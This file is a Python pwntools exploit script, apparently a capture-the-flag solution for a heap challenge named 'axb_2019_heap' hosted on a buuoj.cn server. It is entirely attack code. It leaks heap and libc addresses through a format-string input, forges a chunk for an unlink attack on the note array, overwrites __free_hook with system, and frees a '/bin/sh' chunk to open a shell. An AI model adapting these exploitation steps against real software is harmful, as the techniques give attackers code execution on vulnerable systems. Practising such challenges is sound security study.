from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv
from subprocess import check_output

s = lambda data: p.send(str(data))
sa = lambda delim,data: p.sendafter(delim,str(data))
sl = lambda data: p.sendline(str(data))
sla = lambda delim,data: p.sendlineafter(delim,str(data))
r = lambda num=4096: p.recv(num)
ru = lambda delims,drop=True: p.recvuntil(delims,drop)
uu64 = lambda data: u64(data.ljust(8,'\0'))
leak = lambda name,addr: log.success('{} = {:#x}'.format(name, addr))

def leak_libc(func,addr,elf=None):
	if elf:
		libc = elf
		base = addr-libc.sym[func]
		leak('base',base)
		system = base+libc.sym['system']
	else:
		libc = LibcSearcher(func,addr)
		base = addr-libc.dump(func)
		leak('base',base)
		system = base+libc.dump('system')

	return (base,libc,system)

context.log_level = 'DEBUG'
binary = './axb_2019_heap'
context.binary = binary
elf = ELF(binary,checksec=False)
libc_path = '/lib/x86_64-linux-gnu/libc.so.6'
#libc_path = './glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc-2.27.so'
#env={'LD_PRELOAD':libc_path}
libc = ELF(libc_path,checksec=False)
one = map(int, check_output(['one_gadget','--raw',libc_path]).split(' '))
p = remote('node3.buuoj.cn',28195) if argv[1]=='r' else process(binary)

def dbg():
	gdb.attach(p)
	pause()

_add,_free,_edit,_show = 1,2,4,3
def add(index,size,content='a'*8):
	sla('>>',_add)
	sla('):',index)
	sla('size:',size)
	sla('content:',content)

def free(index):
	sla('>>',_free)
	sla('index:',index)

def edit(index,content):
	sla('>>',_edit)
	sla('index:',index)
	sla('content:',content)

def show(index):
	sla('choice :',_show)
	sla(':',index)

# start
sla('name: ','%11$p.%15$p')
ru(', ')
heap = int(ru('.'),16)-0x1186
base = int(ru('\n'),16)-0x20830
leak('heap',heap)
leak('base',base)

note = heap+0x202060
system = base+libc.sym['system']
free_hook = base+libc.sym['__free_hook']

add(0,0x98)
add(1,0x98)
add(2,0x90)
add(3,0x90,'/bin/sh\x00')

fd = note-0x18
bk = note-0x10
fake = flat(0,0x91,fd,bk).ljust(0x90,'\x00') + p64(0x90)+'\xa0'
edit(0,fake)
free(1)

edit(0,flat(0,0,0,free_hook,0x98))
edit(0,p64(system))
free(3)
# end

p.interactive()